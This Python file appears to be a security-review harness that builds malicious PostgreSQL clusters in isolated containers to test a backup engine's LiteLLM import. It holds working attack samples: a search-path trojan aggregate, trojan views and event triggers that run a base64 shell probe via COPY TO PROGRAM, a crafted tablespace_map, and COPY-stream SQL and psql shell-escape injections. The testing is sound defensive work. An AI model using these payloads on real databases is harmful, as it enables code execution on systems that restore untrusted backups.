#!/usr/bin/env python3
"""LiteLLM HA import security review (2026-11-23), part 2: malicious HA PostgreSQL 18 clusters against the REAL
product code (ha_litellm.scan_member/PgSink -> tempctr volume import -> ha_litellm.start_ha_cluster, analyse,
salt_binding, read_schema, verdict, export_rows) in throwaway ROOTLESS containers of the isolated lab Podman store
(~/.woowbk-lab/bin/labpodman: its own storage root; production containers and images are invisible to it), every
container with --network=none (tempctr's default), the pinned official PostgreSQL 18.7 image by content (4ea77c70).

  PYTHONPATH=backup-engine python3 -I tests/e2e/lab/litellm_sandbox_review.py --case owner_trojan > out.json

Cases (each crafts its own cluster in a throwaway container, packs it as an HA add-on member, runs the product path):
  owner_trojan      objects HA's NON-superuser database owner `litellm` can create itself (a compromised LiteLLM in
                    HA): public.json_agg(name) aggregate (search-path trojan, CVE-2018-1058 class) and
                    public._prisma_migrations replaced by a view over a plpgsql function.
  owner_view        only the view part of owner_trojan (no aggregate): public._prisma_migrations as a view over a
                    plpgsql function, read by the engine as the superuser.
  superuser_catalog objects only a superuser (or a crafted data directory) has: a login and a ddl_command_end event
                    trigger, per-database settings (session_preload_libraries, DateStyle, extra_float_digits).
  tablespace_map    a cold cluster plus backup_label + tablespace_map (no symlink in the archive).
  stored_settings   a clean cluster whose LiteLLM_Config holds stored environment variables and callbacks (SR-5): what
                    ha_litellm.stored_settings reads from it on the real PostgreSQL 18 (names only).
  copy_injection    (no HA cluster) PostgreSQL 17.11's psql: `COPY ... FROM STDIN` data that ends with `\\.` and
                    SQL after it, the way load_rows feeds HA's rows.
Every attacker action writes a marker inside the container only (/tmp/woowbk-review-*); the harness reads the markers
back before the throwaway objects are removed. Output: one JSON document of fixed facts (no data value, no secret;
the salt is a generated test value, the clusters use trust on their unix socket only)."""
import argparse
import base64
import datetime
import hashlib
import io
import json
import os
import re
import secrets
import sys
import tarfile
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO = HERE.parents[2]
if str(REPO / 'backup-engine') not in sys.path:
    sys.path.insert(0, str(REPO / 'backup-engine'))

from woowbackup import habackup, ha_litellm, ha_odoo, tempctr  # noqa: E402
from woowbackup.errors import BackupError  # noqa: E402
from woowbackup.podman import Result, default_runner  # noqa: E402

LABPODMAN = Path.home() / '.woowbk-lab/bin/labpodman'
PG18 = ha_litellm.PG18_IDS[0]
PG17 = 'sha256:094ecc9ca4ea66931822a93f1d814e059deda57f355d9416fa72f85170871cb7'  # postgres:17.11-alpine3.23
CRAFT_DATA = '/var/lib/postgresql/craft'

# What attacker code records about the place it runs in (busybox sh of the image; no value of any secret).
PROBE = r'''t="$1"; f="/tmp/woowbk-review-$t.txt"; {
echo "tag=$t"; echo "id=$(id)"
grep -E '^(CapEff|CapPrm|NoNewPrivs|Seccomp):' /proc/self/status | tr '\t' ' '
echo "ifaces=$(ls /sys/class/net | tr '\n' ' ')"
echo "default_routes=$(awk 'NR>1 && $2=="00000000"' /proc/net/route | wc -l)"
echo "mounts=$(awk '{print $5":"$6}' /proc/self/mountinfo | grep -E '^/(tmp|var/tmp|run|dev/shm|var/lib/postgresql|var/run/postgresql)?:' | tr '\n' ' ')"
echo "run_secrets=$(ls -A /run/secrets 2>/dev/null | wc -l)"
echo "env_names=$(env | cut -d= -f1 | sort | tr '\n' ' ')"
mkdir -p /tmp/woowbk-x && cp /bin/busybox /tmp/woowbk-x/true 2>/dev/null && /tmp/woowbk-x/true 2>/dev/null && echo "tmp_exec=yes" || echo "tmp_exec=no"
rm -rf /tmp/woowbk-x
mkdir -p /var/lib/postgresql/woowbk-x && cp /bin/busybox /var/lib/postgresql/woowbk-x/true 2>/dev/null && /var/lib/postgresql/woowbk-x/true 2>/dev/null && echo "data_exec=yes" || echo "data_exec=no"
rm -rf /var/lib/postgresql/woowbk-x
touch /etc/woowbk-probe 2>/dev/null && echo "root_write=yes" || echo "root_write=no"
(wget -q -T 3 -O /dev/null http://1.1.1.1/ 2>/dev/null && echo "egress_ip=yes") || echo "egress_ip=no"
(getent hosts example.com >/dev/null 2>&1 && echo "dns=yes") || echo "dns=no"
echo "pids_max=$(cat /sys/fs/cgroup/pids.max 2>/dev/null)"; echo "mem_max=$(cat /sys/fs/cgroup/memory.max 2>/dev/null)"
echo "procs_visible=$(ls -d /proc/[0-9]* | wc -l)"
echo "host_root_visible=$(ls /home 2>/dev/null | wc -l)"
} > "$f" 2>&1
'''
PROBE_B64 = base64.b64encode(PROBE.encode()).decode()


def probe_function(owner_check=False):
    """public.woowbk_probe(tag): runs PROBE through COPY TO PROGRAM (needs a superuser session: the engine's)."""
    return (r"""CREATE FUNCTION public.woowbk_probe(tag text) RETURNS boolean LANGUAGE plpgsql AS $f$
BEGIN
  IF tag !~ '^[a-z_]{1,40}$' THEN RETURN true; END IF;
  EXECUTE format('COPY (SELECT 1) TO PROGRAM %L', 'echo """ + PROBE_B64 + r""" | base64 -d | sh -s ' || tag || '_' || current_user);
  RETURN true;
EXCEPTION WHEN OTHERS THEN
  RETURN true;
END $f$;
""")


SALT = None  # generated per run


def base_sql(salt, fingerprint, *, view_migrations=False):
    """The litellm database as HA's add-on lays it out (simplified LiteLLM tables), created as role litellm."""
    migrations = "('m1', 'c', now(), '20250326162113_baseline', NULL, NULL, now(), 1)"
    table = '_prisma_migrations_real' if view_migrations else '_prisma_migrations'
    return f"""
SET ROLE litellm;
CREATE SCHEMA woow_platform;
CREATE TABLE woow_platform.settings (key text PRIMARY KEY, value text NOT NULL);
INSERT INTO woow_platform.settings VALUES ('litellm_salt_key', '{salt}');
CREATE TABLE public."{table}" (id varchar(36) PRIMARY KEY, checksum varchar(64) NOT NULL, finished_at timestamptz,
  migration_name varchar(255) NOT NULL, logs text, rolled_back_at timestamptz, started_at timestamptz NOT NULL DEFAULT now(),
  applied_steps_count integer NOT NULL DEFAULT 0);
INSERT INTO public."{table}" VALUES {migrations};
CREATE TABLE public."LiteLLM_UserTable" (user_id text PRIMARY KEY, user_role text, spend double precision,
  created_at timestamp(3) without time zone, budget_reset_at timestamptz);
INSERT INTO public."LiteLLM_UserTable" VALUES ('u1', 'proxy_admin', 0.123456789012345, '2026-11-05 10:00:00', '2026-11-05 10:00:00+00');
RESET ROLE;
CREATE SCHEMA woow AUTHORIZATION postgres;
CREATE TABLE woow.meta (key text PRIMARY KEY, value text NOT NULL);
INSERT INTO woow.meta VALUES ('salt_fingerprint_v1', '{fingerprint}');
"""


OWNER_TROJAN_SQL = r"""
SET ROLE litellm;
CREATE FUNCTION public.woowbk_agg_step(state json, value name) RETURNS json LANGUAGE plpgsql AS $f$
BEGIN
  PERFORM public.woowbk_probe('aggregate_json_agg_name');
  RETURN (coalesce(state::jsonb, '[]'::jsonb) || jsonb_build_array(value::text))::json;
END $f$;
CREATE AGGREGATE public.json_agg(name) (SFUNC = public.woowbk_agg_step, STYPE = json);
CREATE FUNCTION public.woowbk_view_rows() RETURNS SETOF public._prisma_migrations_real LANGUAGE plpgsql AS $f$
BEGIN
  PERFORM public.woowbk_probe('view_prisma_migrations');
  RETURN QUERY SELECT * FROM public._prisma_migrations_real;
END $f$;
CREATE VIEW public._prisma_migrations AS SELECT * FROM public.woowbk_view_rows();
RESET ROLE;
"""

OWNER_VIEW_SQL = OWNER_TROJAN_SQL[OWNER_TROJAN_SQL.index('CREATE FUNCTION public.woowbk_view_rows'):]
OWNER_VIEW_SQL = 'SET ROLE litellm;\n' + OWNER_VIEW_SQL

SUPERUSER_SQL = r"""
CREATE FUNCTION public.woowbk_et_ddl() RETURNS event_trigger LANGUAGE plpgsql AS $f$
BEGIN PERFORM public.woowbk_probe('event_trigger_ddl_end'); END $f$;
CREATE EVENT TRIGGER woowbk_et_ddl ON ddl_command_end EXECUTE FUNCTION public.woowbk_et_ddl();
ALTER EVENT TRIGGER woowbk_et_ddl ENABLE ALWAYS;
CREATE FUNCTION public.woowbk_et_login() RETURNS event_trigger LANGUAGE plpgsql AS $f$
BEGIN PERFORM public.woowbk_probe('event_trigger_login'); END $f$;
CREATE EVENT TRIGGER woowbk_et_login ON login EXECUTE FUNCTION public.woowbk_et_login();
ALTER EVENT TRIGGER woowbk_et_login ENABLE ALWAYS;
ALTER DATABASE litellm SET session_preload_libraries = 'auto_explain';
ALTER DATABASE litellm SET woowbk.review = 'database-setting-applied';
ALTER DATABASE litellm SET "DateStyle" = 'SQL, DMY';
ALTER DATABASE litellm SET extra_float_digits = -10;
ALTER ROLE postgres IN DATABASE litellm SET event_triggers = on;
"""


# LiteLLM_Config as LiteLLM 1.104.0's schema.prisma has it (param_value Json? = jsonb); placeholder values only.
STORED_SETTINGS_SQL = r"""
SET ROLE litellm;
CREATE TABLE public."LiteLLM_Config" (param_name text PRIMARY KEY, param_value jsonb, last_run_at timestamp(3),
  reload_revision bigint NOT NULL DEFAULT 0);
INSERT INTO public."LiteLLM_Config" (param_name, param_value) VALUES
 ('environment_variables', '{"HTTPS_PROXY": "placeholder-not-a-value", "LANGFUSE_HOST": "placeholder"}'),
 ('litellm_settings', '{"success_callback": ["langfuse"], "callbacks": ["custom_callbacks.proxy_handler_instance", {"x": 1}], "drop_params": true}'),
 ('general_settings', '{"alerting": ["slack"]}');
RESET ROLE;
"""


class LabRunner:
    """The lab Podman (its own storage root) with the product runner's interface."""
    uid = None
    owner = 'lab'

    def podman(self, *args, input=None, stdout=None, timeout=120, check=True, max_output=None, abort=None):
        result = default_runner([str(LABPODMAN), *args], input=input, stdout=stdout, timeout=timeout,
                                max_output=max_output, abort=abort)
        if check and result.returncode:
            tail = (result.stderr or b'')[-400:].decode('utf-8', 'replace')
            raise BackupError('job-failed', f'lab podman {args[0]} {args[1] if len(args) > 1 else ""} '
                                            f'rc={result.returncode}: {tail}')
        return Result(result.returncode, result.stdout, result.stderr or b'')

    def relay(self, args, *, stdout=None, timeout=120, max_output=None, abort=None):
        return self.podman(*args, stdout=stdout, timeout=timeout, max_output=max_output, abort=abort)


class Guard:
    def budget(self):
        return 256 * 1024 * 1024

    def wrote(self, _n):
        pass

    def check(self, _need=0):
        pass


class Work:
    def __init__(self):
        self.notes = []
        self.guard = Guard()

    def log(self, text):
        self.notes.append(str(text)[:200])

    def checkpoint(self):
        pass


def job_id(tag):
    now = datetime.datetime.now(datetime.timezone.utc).strftime('%Y%m%dT%H%M%SZ')
    return f'j{now}-{hashlib.sha256((tag + secrets.token_hex(4)).encode()).hexdigest()[:8]}'


def volumes_now(runner):
    """Dangling volumes (no container uses them; other lanes' running jobs are not counted) and this review's own."""
    out = runner.podman('volume', 'ls', '--filter', 'dangling=true', '--format', '{{.Name}}',
                        max_output=1 << 20).stdout or b''
    return set(out.decode().split())


def craft(case, salt, fingerprint, scratch):
    """Build the malicious cluster in a throwaway container; returns the add-on inner tar (bytes)."""
    runner = LabRunner()
    with tempctr.TempObjects(runner, job_id('craft'), memory='1g', pids=512, cpus='1') as tmp:
        tmp.volume('craft')
        tmp.run('craft', PG18, ['postgres'], detach=True,
                env={'POSTGRES_HOST_AUTH_METHOD': 'trust', 'PGDATA': CRAFT_DATA},
                volumes=[(tmp.name('craft'), '/var/lib/postgresql', 'rw')])
        cluster = ha_odoo.Cluster(tmp, 'craft')
        cluster.wait_ready(tcp=True)  # the entrypoint's final server (its temporary one has no TCP listener)
        cluster.statement("CREATE ROLE litellm LOGIN NOSUPERUSER", 'postgres')
        cluster.statement("CREATE DATABASE litellm OWNER litellm ENCODING 'UTF8' TEMPLATE template0", 'postgres')
        cluster.script('SET ROLE litellm;\n' + probe_function() + 'RESET ROLE;\n', 'litellm')
        cluster.script(base_sql(salt, fingerprint, view_migrations=case in ('owner_trojan', 'owner_view')), 'litellm')
        if case == 'owner_trojan':
            cluster.script(OWNER_TROJAN_SQL, 'litellm')
        elif case == 'owner_view':
            cluster.script(OWNER_VIEW_SQL, 'litellm')
        elif case == 'superuser_catalog':
            cluster.script(SUPERUSER_SQL, 'litellm')
        elif case == 'stored_settings':
            cluster.script(STORED_SETTINGS_SQL, 'litellm')
        # The crafting session must not leave markers behind: the volume is what HA's backup would carry.
        tmp.exec('craft', ['sh', '-c', 'rm -f /tmp/woowbk-review-*'], user='postgres', check=False, max_output=4096)
        tmp.stop('craft', timeout=60)
        if case == 'tablespace_map':
            control = tmp.run('ctl', PG18, ['-c', f'pg_controldata {CRAFT_DATA}'], entrypoint='sh', user='postgres',
                              volumes=[(tmp.name('craft'), '/var/lib/postgresql', 'rw')], max_output=1 << 20).stdout
            text = control.decode()
            redo = re.search(r"Latest checkpoint's REDO location:\s+(\S+)", text).group(1)
            redo_file = re.search(r"Latest checkpoint's REDO WAL file:\s+(\S+)", text).group(1)
            location = re.search(r'Latest checkpoint location:\s+(\S+)', text).group(1)
            label = (f'START WAL LOCATION: {redo} (file {redo_file})\nCHECKPOINT LOCATION: {location}\n'
                     'BACKUP METHOD: streamed\nBACKUP FROM: primary\nSTART TIME: 2026-11-23 12:00:00 UTC\n'
                     'LABEL: woowbk-review\nSTART TIMELINE: 1\n')
            payload = f'cat > {CRAFT_DATA}/backup_label <<"EOF"\n{label}EOF\n' \
                      f'printf "16400 /tmp/woowbk-review-tablespace\\n" > {CRAFT_DATA}/tablespace_map\n'
            tmp.run('lbl', PG18, ['-c', payload], entrypoint='sh', user='postgres',
                    volumes=[(tmp.name('craft'), '/var/lib/postgresql', 'rw')], max_output=1 << 20)
        export = scratch / f'{case}-volume.tar'
        with open(export, 'xb') as handle:
            tmp.volume_export('craft', handle)
    return member_from_volume(export, salt)


def member_from_volume(export, salt):
    addon = {'user': {'version': '0.1.15', 'image': 'ghcr.io/woowtech/woow-ha-litellm-amd64', 'options': {}},
             'system': {'slug': 'woow-litellm', 'name': 'Woow LiteLLM'}, 'version': '0.1.15'}
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode='w', format=tarfile.PAX_FORMAT) as dest:
        def add(name, data=None, kind=tarfile.REGTYPE, mode=0o600):
            info = tarfile.TarInfo(name)
            info.type, info.mode, info.uid, info.gid, info.mtime = kind, mode, 70, 70, 1763900000
            if data is not None:
                info.size = len(data)
            dest.addfile(info, io.BytesIO(data) if data is not None else None)
        add('.', kind=tarfile.DIRTYPE, mode=0o755)
        add('./addon.json', json.dumps(addon).encode(), mode=0o644)
        for d in ('data', 'data/secrets', 'data/woow', 'data/postgres'):
            add(d, kind=tarfile.DIRTYPE, mode=0o700)
        add('data/secrets/salt_key', salt.encode() + b'\n')
        add('data/woow/state.json', b'{"litellm_version": "1.104.0"}')
        with tarfile.open(export, mode='r') as source:
            for info in source:
                name = info.name.lstrip('./') if info.name not in ('.', './') else ''
                if not name.startswith('craft'):
                    continue
                rel = name[len('craft'):].lstrip('/')
                if not rel:
                    continue
                info.name = f'data/postgres/{rel}'
                if info.isfile():
                    dest.addfile(info, source.extractfile(info))
                elif info.isdir() or info.issym():
                    dest.addfile(info)
    return out.getvalue()


def markers(tmp, role):
    result = tmp.exec(role, ['sh', '-c', 'for f in /tmp/woowbk-review-*.txt; do [ -f "$f" ] && { echo "== $f"; cat "$f"; }; '
                                         'done; true'], user='postgres', check=False, max_output=1 << 20)
    found = {}
    current = None
    for line in (result.stdout or b'').decode('utf-8', 'replace').splitlines():
        if line.startswith('== '):
            current = line[3:].rsplit('/', 1)[-1]
            found[current] = {}
        elif current and '=' in line:
            key, _, value = line.partition('=')
            found[current][key.strip()[:40]] = value.strip()[:400]
        elif current and ':' in line:
            key, _, value = line.partition(':')
            found[current][key.strip()[:40]] = value.strip()[:200]
    return found


def inspect(runner, name):
    out = runner.podman('container', 'inspect', name, max_output=1 << 22).stdout
    doc = json.loads(out)[0]
    host = doc.get('HostConfig') or {}
    return {'network_mode': host.get('NetworkMode'), 'read_only_root': host.get('ReadonlyRootfs'),
            'security_opt': host.get('SecurityOpt'), 'cap_add': host.get('CapAdd'), 'cap_drop': host.get('CapDrop'),
            'memory': host.get('Memory'), 'pids_limit': host.get('PidsLimit'), 'privileged': host.get('Privileged'),
            'mounts': sorted(f"{m.get('Type')}:{m.get('Destination')}:{','.join(m.get('Options') or [])}"
                             for m in doc.get('Mounts') or []),
            'ports': host.get('PortBindings') or {}, 'user': (doc.get('Config') or {}).get('User')}


def product_path(case, inner, salt):
    """The product's check steps (and export_rows) on HA's cluster, as ha_litellm.check/convert run them."""
    runner = LabRunner()
    work = Work()
    facts = {'case': case}
    before = volumes_now(runner)
    with tempctr.TempObjects(runner, job_id(case), memory='1g', pids=512, cpus='1') as tmp:
        pg_ids = tmp.user_ids('ids-pg', PG18, 'postgres')
        tmp.volume('hapg')
        holder = {}

        def produce(out):
            sink = ha_odoo.PgSink(out, *pg_ids)
            holder['src'] = ha_litellm.scan_member(io.BytesIO(inner), habackup.Report(), pg=sink)
            sink.close()

        tmp.volume_import('hapg', produce)
        src = holder['src']
        facts['scan'] = {'pg_version': src.pg_version, 'symlinks': src.symlinks, 'salt_valid': src.salt_valid}
        steps = []
        try:
            cluster = ha_litellm.start_ha_cluster(work, tmp, PG18)
            steps.append('start_ha_cluster')
            facts['container'] = inspect(runner, tmp.name('hapg'))
            facts['after_first_connection'] = markers(tmp, 'hapg')
            facts['session_settings'] = cluster.query_json(
                "SELECT json_build_object('session_preload_libraries', current_setting('session_preload_libraries'), "
                "'review', current_setting('woowbk.review', true), 'datestyle', current_setting('DateStyle'), "
                "'extra_float_digits', current_setting('extra_float_digits'), "
                "'event_triggers', current_setting('event_triggers'), "
                "'shared_preload_libraries', current_setting('shared_preload_libraries'), "
                "'search_path', current_setting('search_path'))", 'litellm')
            found = ha_litellm.analyse(cluster)
            steps.append('analyse')
            facts['after_analyse'] = sorted(markers(tmp, 'hapg'))
            facts['found'] = {'superuser': found['superuser'], 'migrations': found['migrations'],
                              'schemas': found['objects'].get('schemas')}
            binding = ha_litellm.salt_binding(cluster, src)
            steps.append('salt_binding')
            facts['binding'] = binding
            facts['after_salt_binding'] = sorted(markers(tmp, 'hapg'))
            ha_schema = ha_litellm.read_schema(cluster, found['migrations']) if found['migrations'] else None
            steps.append('read_schema')
            if ha_schema is not None and hasattr(ha_litellm, 'stored_settings'):
                facts['stored_settings'] = ha_litellm.stored_settings(cluster, ha_schema)
                facts['stored_settings_line'] = ha_litellm.stored_settings_line(facts['stored_settings'])
            blockers, warnings = ha_litellm.verdict(src, found, ha_major=18, target_major=17,
                                                    live_migrations_value=found['migrations'], binding=binding)
            facts['blockers'] = blockers
            facts['warnings'] = warnings
            if ha_schema is not None:
                with tempfile.TemporaryDirectory(dir=os.environ.get('WOOWBK_REVIEW_SCRATCH')) as staging:
                    files, _seq = ha_litellm.export_rows(work, cluster, ha_schema, Path(staging))
                    steps.append('export_rows')
                    sample = files.get(('public', 'LiteLLM_UserTable'))
                    if sample is not None:
                        row = sample.read_bytes().split(b'\n')[0].split(b'\t')
                        # fixed test row: user_id, role, spend, created_at, budget_reset_at (no secret in it)
                        facts['user_row_as_exported'] = [v.decode('utf-8', 'replace')[:60] for v in row]
            if case == 'tablespace_map':
                link = tmp.exec('hapg', ['sh', '-c', 'ls -la /var/lib/postgresql/pg_tblspc/ | tail -n +2; '
                                         'readlink /var/lib/postgresql/pg_tblspc/16400; '
                                         'ls /var/lib/postgresql | grep -E "backup_label|tablespace_map"'],
                                user='postgres', check=False, max_output=65536).stdout
                facts['pg_tblspc'] = (link or b'').decode('utf-8', 'replace').splitlines()[:10]
        except BackupError as error:
            facts['stopped_with'] = {'code': error.code, 'message': str(error)[:300]}
            if case == 'tablespace_map':  # what the server's start left in HA's volume
                left = tmp.run('look', PG18, ['-c', 'ls -la /var/lib/postgresql/pg_tblspc/ | tail -n +2; '
                                              'readlink /var/lib/postgresql/pg_tblspc/16400; '
                                              'ls /var/lib/postgresql | grep -E "backup_label|tablespace_map"'],
                               entrypoint='sh', user='postgres', read_only_root=True,
                               volumes=[(tmp.name('hapg'), ha_litellm.HA_PGDATA, 'ro,noexec,nosuid,nodev')],
                               check=False, max_output=65536).stdout
                facts['pg_tblspc'] = (left or b'').decode('utf-8', 'replace').splitlines()[:10]
        facts['steps'] = steps
        facts['markers_final'] = markers(tmp, 'hapg') if tmp.running('hapg') else 'container not running'
    facts['volumes_left_behind'] = sorted(volumes_now(runner) - before)
    facts['notes'] = work.notes[-5:]
    return facts


def copy_injection():
    """PostgreSQL 17.11's psql (the live litellm-postgres image) fed the way load_rows feeds HA's rows."""
    runner = LabRunner()
    facts = {'case': 'copy_injection'}
    with tempctr.TempObjects(runner, job_id('copy'), memory='1g', pids=512, cpus='1') as tmp:
        tmp.volume('ll')
        tmp.run('ll', PG17, [], detach=True, env={'POSTGRES_HOST_AUTH_METHOD': 'trust', 'POSTGRES_USER': 'litellm',
                                                   'POSTGRES_DB': 'litellm', 'PGDATA': '/var/lib/postgresql/data/pgdata'},
                volumes=[(tmp.name('ll'), '/var/lib/postgresql/data', 'rw,noexec,nosuid,nodev')], read_only_root=True)
        cluster = ha_odoo.Cluster(tmp, 'll', superuser='litellm')
        cluster.wait_ready(tcp=True)
        cluster.script('CREATE TABLE public.t (a text, b text);\n'
                       f'CREATE ROLE {ha_litellm.RESTORE_ROLE} LOGIN NOSUPERUSER;\n'
                       f'GRANT INSERT ON public.t TO {ha_litellm.RESTORE_ROLE};\n', 'litellm')
        payloads = {
            'end_marker_then_sql': b'x\ty\n\\.\nCREATE TABLE public.injected_a ();\nSELECT 1;\n',
            'end_marker_crlf_then_sql': b'x\ty\r\n\\.\r\nCREATE TABLE public.injected_b ();\r\n',
            'psql_meta_after_end': b'x\ty\n\\.\n\\! touch /tmp/woowbk-review-psql-shell\n',
            'sql_as_data': b"x\t'); CREATE TABLE public.injected_c (); --\n",
        }
        for name, data in payloads.items():
            result = tmp.exec('ll', ['psql', '-X', '-q', '-v', 'ON_ERROR_STOP=1', '-1', '-U', ha_litellm.RESTORE_ROLE,
                                     '-d', 'litellm', '-c', ha_litellm.copy_in_sql('public', 't', ['a', 'b'])],
                              user='postgres', input=data, check=False, max_output=65536)
            facts[name] = {'returncode': result.returncode}
        state = cluster.query_json("SELECT json_build_object('rows', (SELECT count(*) FROM public.t), 'injected', "
                                   "(SELECT coalesce(json_agg(relname), '[]'::json) FROM pg_class WHERE relname LIKE "
                                   "'injected%'))", 'litellm')
        shell = tmp.exec('ll', ['sh', '-c', 'ls /tmp/woowbk-review-psql-shell 2>/dev/null | wc -l'], user='postgres',
                         check=False, max_output=4096).stdout
        facts['after'] = state
        facts['psql_shell_marker_files'] = int((shell or b'0').strip() or 0)
    return facts


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--case', required=True,
                        choices=('owner_trojan', 'owner_view', 'superuser_catalog', 'tablespace_map', 'stored_settings',
                                 'copy_injection'))
    args = parser.parse_args()
    started = time.monotonic()
    if args.case == 'copy_injection':
        facts = copy_injection()
    else:
        salt = 'sk-' + secrets.token_hex(32)  # generated for this run only; never printed
        fingerprint = hashlib.sha256(b'woow-litellm-salt-v1:' + salt.encode()).hexdigest()[:16]
        scratch = Path(tempfile.mkdtemp(prefix='woowbk-review-', dir=os.environ.get('WOOWBK_REVIEW_SCRATCH')))
        os.chmod(scratch, 0o700)
        inner = craft(args.case, salt, fingerprint, scratch)
        facts = product_path(args.case, inner, salt)
        for path in scratch.iterdir():
            path.unlink()
        scratch.rmdir()
    facts['elapsed_seconds'] = round(time.monotonic() - started, 1)
    facts['image_pg18'] = PG18
    facts['source'] = source_state()
    json.dump(facts, sys.stdout, indent=1, sort_keys=True, ensure_ascii=False)
    sys.stdout.write('\n')


def source_state():
    """The commit the product code and this harness ran from (and whether the tree had other changes)."""
    import subprocess
    head = subprocess.run(['git', '-C', str(REPO), 'rev-parse', 'HEAD'], capture_output=True, text=True,
                          timeout=60).stdout.strip()
    dirty = subprocess.run(['git', '-C', str(REPO), 'status', '--porcelain', '--untracked-files=no'],
                           capture_output=True, text=True, timeout=60).stdout.strip()
    product = hashlib.sha256((REPO / 'backup-engine/woowbackup/ha_litellm.py').read_bytes()).hexdigest()
    return {'commit': head, 'tracked_changes': bool(dirty), 'ha_litellm_sha256': product}


if __name__ == '__main__':
    main()
